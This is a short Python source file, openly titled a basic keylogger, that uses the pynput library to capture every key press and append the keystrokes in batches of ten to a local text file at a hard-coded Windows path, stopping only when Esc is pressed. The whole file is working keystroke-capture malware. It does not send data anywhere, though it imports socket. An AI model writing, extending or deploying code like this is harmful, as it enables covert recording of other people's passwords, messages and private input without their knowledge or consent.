# Basic keylogger that saves the key log file as a local file. key_log.txt at the specified file path location
import socket
import platform
import pynput

import time
import os



from pynput.keyboard import Key, Listener

keys_information = "key_log.txt"

file_path = "C:\\Users\\Desktop\\keylogs\\basicLogs"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
    
def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
    

with Listener(on_press =on_press, on_release =on_release) as listener:
    listener.join()


